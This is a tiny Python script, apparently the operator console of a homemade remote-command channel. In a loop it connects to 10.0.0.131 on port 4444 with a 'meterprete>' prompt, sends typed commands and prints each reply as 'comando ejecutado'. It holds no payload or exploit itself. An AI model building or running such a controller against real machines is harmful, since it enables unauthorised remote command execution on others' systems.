import socket

ki = ("10.0.0.131",4444)

while 2 == 2:
    po = socket.socket()
    po.connect((ki))
    lol = "meterprete> "
    pu = input(lol )
    po.send(pu.encode())
    u = po.recv(1024)
    m = "comando ejecutado"
    print(m,u.decode())
    po.close()
